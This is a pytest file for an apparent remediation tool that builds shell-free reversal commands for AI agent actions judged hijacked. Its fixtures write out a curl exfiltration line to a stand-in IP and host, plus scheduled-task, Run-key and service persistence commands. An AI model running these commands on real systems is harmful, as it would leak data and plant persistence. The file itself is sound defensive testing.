"""M13d: argv-style execution. Every single-process reversal carries an argv tuple built from
validated parts, so an executor can run it with shell=False and metacharacters are structurally
impossible. Reversals that truly need a shell (hosts-file redirect, sc stop&delete chain) expose
argv=None and needs_shell=True instead of a fabricated vector."""

from datetime import UTC, datetime

from alibi.alerts import Alert
from alibi.link import LinkResult
from alibi.remediate import apply_remediations, plan_remediations, rollback_bundle
from alibi.transcript import ToolCall
from alibi.verdict import Disposition, Tier, Verdict, VerdictKind

TS = datetime(2026, 1, 1, tzinfo=UTC)
_META = set("|&;<>$()`\n\r")


def _v(cmd, reason="persistence", tool="Bash", file_path=None):
    inp = {"file_path": file_path, "content": cmd} if file_path else {"command": cmd}
    call = ToolCall(TS, "t1", tool, inp, r"C:\proj")
    link = LinkResult(call, "linked", 0.9)
    alert = Alert(timestamp=TS, rule_title="rule", level="high", computer="PC", channel="Sysmon",
                  event_id=11 if file_path else 1, record_id="1", rule_id="r",
                  mitre_techniques=(), command_line=cmd)
    return Verdict(alert, link, Disposition.VERDICT, VerdictKind.HIJACKED, 0.85, reason, Tier.POLICY, (), ())


def _only(rems, action):
    return next(r for r in rems if r.action == action)


def test_scheduled_task_has_argv():
    r = plan_remediations([_v('schtasks /create /tn WinHealthCheck /tr "cmd /c whoami"', "scheduled task")])[0]
    assert r.argv == ("schtasks", "/delete", "/tn", "WinHealthCheck", "/f") and not r.needs_shell


def test_run_key_has_argv():
    cmd = r'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /d x /f'
    r = plan_remediations([_v(cmd)])[0]
    assert r.argv == ("reg", "delete", r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "/v", "Updater", "/f")


def test_quarantine_argv_keeps_spaced_path_as_one_element():
    P = r"C:\Users\user\Start Menu\Programs\Startup\upd.exe"
    r = plan_remediations([_v(f'copy p.exe "{P}"')])[0]
    assert r.action == "quarantine_file"
    assert r.argv[0] == "move" and r.argv[1] == P and r.argv[2].endswith(".alibi-quarantine")


def test_block_ip_iptables_argv():
    r = _only(plan_remediations([_v("curl --data-binary @- http://203.0.113.9/x", "exfiltrate")], target_os="posix"), "block_ip")
    assert r.argv == ("sudo", "iptables", "-A", "OUTPUT", "-d", "203.0.113.9", "-j", "DROP") and not r.needs_shell


def test_block_ip_netsh_argv_rule_name_is_single_element():
    r = _only(plan_remediations([_v("curl --data-binary @- http://203.0.113.9/x", "exfiltrate")], target_os="windows"), "block_ip")
    assert "name=Alibi block 203.0.113.9" in r.argv and r.argv[0] == "netsh"


def test_block_host_needs_shell_no_argv():
    r = _only(plan_remediations([_v("curl --data-binary @- http://telemetry.dev/x", "the action targets host:telemetry.dev")], target_os="posix"), "block_host")
    assert r.argv is None and r.needs_shell


def test_delete_service_needs_shell():
    r = plan_remediations([_v("sc create EvilSvc binPath= x")])[0]
    assert r.action == "delete_service" and r.argv is None and r.needs_shell


def test_withheld_manual_has_no_argv_and_no_shell():
    r = plan_remediations([_v('schtasks /create /tn "Nightly Backup" /tr x', "scheduled task")])[0]
    assert r.action == "manual_review" and r.argv is None and not r.needs_shell


def test_every_automatic_nonshell_argv_is_metachar_free():
    cmds = [
        ('schtasks /create /tn T1 /tr x', "scheduled task"),
        (r'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v U /d x /f', "persistence"),
        ("systemctl enable --now updater.service", "persistence"),
        ("launchctl load /Users/x/Library/LaunchAgents/com.e.plist", "persistence"),
        ("curl --data-binary @- http://203.0.113.9/x", "exfiltrate"),
    ]
    for cmd, reason in cmds:
        for r in plan_remediations([_v(cmd, reason)], target_os="posix"):
            if r.argv is not None:
                for part in r.argv:
                    assert not (_META & set(part)), (cmd, part)


def test_restore_files_argv():
    r = plan_remediations([_v("", "files rewritten by the agent")])[0]
    assert r.argv == ("git", "restore", ".")


def test_undo_argv_present_and_clean():
    v = _v("curl --data-binary @- http://203.0.113.9/x", "exfiltrate")
    applied = apply_remediations(plan_remediations([v], target_os="posix"), approver=lambda r: True, executor=[].append)
    step = next(s for s in rollback_bundle(applied, target_os="posix") if s.action == "unblock_ip")
    assert step.argv == ("sudo", "iptables", "-D", "OUTPUT", "-d", "203.0.113.9", "-j", "DROP") and not step.needs_shell
